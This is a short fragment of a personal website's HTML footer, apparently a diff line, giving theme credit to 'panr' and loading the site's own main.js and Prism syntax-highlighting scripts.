+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
